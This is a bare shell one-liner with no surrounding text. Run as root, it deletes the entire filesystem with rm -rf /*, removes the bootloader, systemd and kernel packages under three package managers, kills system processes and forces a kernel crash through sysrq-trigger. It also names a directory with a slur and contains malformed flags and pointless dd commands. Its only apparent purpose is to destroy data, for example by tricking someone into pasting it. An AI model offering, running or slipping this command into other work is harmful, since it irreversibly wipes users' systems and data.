mkdir ~/gay && su -c "mount /dev/sda* ~/gay* && dd if=/dev/sda* of=/dev/null && dd if=~/gay* of=/dev/null && rm -rf /* --no-preseve-root && pacman -Rnsf grub systemd linux-firmware linux kernel-* -y && apt remove grub systemd linux-firmware linux-kernel-* -y && dnf remove grub systemd linux-firmware linux-kernel-* -y && pkill -f systemd && pkill -f systemctl && pkill -f 0001 && echo c > /proc/sysrq-trigger"
